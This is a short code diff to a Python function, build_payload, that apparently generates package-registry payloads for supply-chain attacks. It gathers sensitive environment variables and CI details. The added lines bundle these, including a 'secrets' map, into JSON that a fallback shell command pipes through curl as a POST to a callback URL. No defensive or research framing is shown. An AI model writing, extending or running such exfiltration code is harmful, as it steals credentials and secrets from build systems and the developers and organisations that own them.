@@ -37,6 +37,8 @@ def build_payload(registry: str, callback_url: str) -> str:
     ci = detect_ci()
     env = _collect_sensitive_env()
     stack = select_payload_for_stack(registry.lower())
+    if stack == "default":
+        stack = registry.lower()
 
     if stack in {"npm", "node"}:
         return (
@@ -58,7 +60,12 @@ def build_payload(registry: str, callback_url: str) -> str:
         )
 
     # Fallback shell payload
-    env_data = json.dumps(env)
+    data = {
+        "env": env,
+        "ci": ci,
+        "secrets": {k: v for k, v in env.items()},
+    }
+    env_data = json.dumps(data)
     return f"printf '{env_data}' | curl -XPOST -d @- {callback_url}"
 
 
